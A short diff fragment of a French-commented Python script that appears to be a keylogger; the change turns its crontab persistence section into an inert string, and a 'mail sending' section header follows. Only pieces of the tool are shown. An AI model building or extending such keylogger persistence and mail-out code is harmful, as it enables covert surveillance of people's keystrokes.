@@ -11,7 +11,7 @@ import os
 
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
-
+"""
 # Chemin vers le script Python
 python_script = os.getcwd()+'/keylogger'
 
@@ -33,7 +33,7 @@ else:
     print("Le script Python est déjà dans crontab.")
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
-
+"""
 
 #--------DÉBUT PARTIE ENVOI MAIL----------------
 
